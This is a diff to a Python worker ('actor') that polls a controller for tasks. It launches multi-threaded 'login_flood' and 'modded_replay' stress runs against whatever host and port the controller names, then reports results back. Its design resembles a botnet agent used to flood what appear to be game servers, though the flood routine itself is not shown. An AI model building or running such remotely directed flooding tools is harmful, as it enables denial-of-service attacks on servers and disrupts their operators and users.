@@ -1,39 +1,47 @@
 import requests
 import time
 from .config import CONTROLLER_HOST, ACTOR_ID
-from .stress import run_stress, probe_modlist
+from .stress import run_stress
 
 def actor_loop():
     while True:
         try:
-            r = requests.get(f"{CONTROLLER_HOST}/task?actor_id={ACTOR_ID}")
+            r = requests.get(f"{CONTROLLER_HOST}/task?actor_id={ACTOR_ID}", timeout=10)
             if r.status_code == 200:
                 task = r.json()
-                print(f"[ACTOR {ACTOR_ID}] Task: {task}")
-                mode = task.get("mode", "login_flood")
+                mode = task.get("mode", "idle")
 
                 if mode == "idle":
-                    print(f"[ACTOR {ACTOR_ID}] Received idle task. Sleeping.")
-                    time.sleep(10)
+                    time.sleep(5)
                     continue
+                
+                print(f"[ACTOR {ACTOR_ID}] Received task: {mode}")
 
-                if mode == "modded_probe":
-                    probe_modlist(task['host'], task['port'])
-                elif mode in ("modded_replay", "login_flood"):
-                    run_stress(task['host'], task['port'], task['threads'], task['duration'], use_modlist=(mode=="modded_replay"))
+                # The controller now handles probing, actor just receives data
+                mod_data = task.get("mod_data")
+                
+                run_stress(
+                    ip=task['host'],
+                    port=task['port'],
+                    threads=task['threads'],
+                    duration=task['duration'],
+                    mode=mode,
+                    mod_data=mod_data
+                )
 
                 log_payload = {
                     "actor_id": ACTOR_ID,
-                    "event": f"Finished {mode}"
+                    "level": "INFO",
+                    "message": f"Finished task: {mode}"
                 }
-                requests.post(f"{CONTROLLER_HOST}/log", json=log_payload)
+                requests.post(f"{CONTROLLER_HOST}/log", json=log_payload, timeout=5)
             else:
                 print(f"[ACTOR {ACTOR_ID}] Error fetching task: {r.status_code}")
                 time.sleep(5)
         except Exception as e:
             print(f"[ACTOR {ACTOR_ID}] Exception: {e}")
             try:
-                requests.post(f"{CONTROLLER_HOST}/log", json={"actor_id": ACTOR_ID, "error": str(e)})
+                requests.post(f"{CONTROLLER_HOST}/log", json={"actor_id": ACTOR_ID, "level": "ERROR", "message": str(e)}, timeout=5)
             except:
-                pass
+                pass # Suppress errors if controller is unreachable
             time.sleep(5)
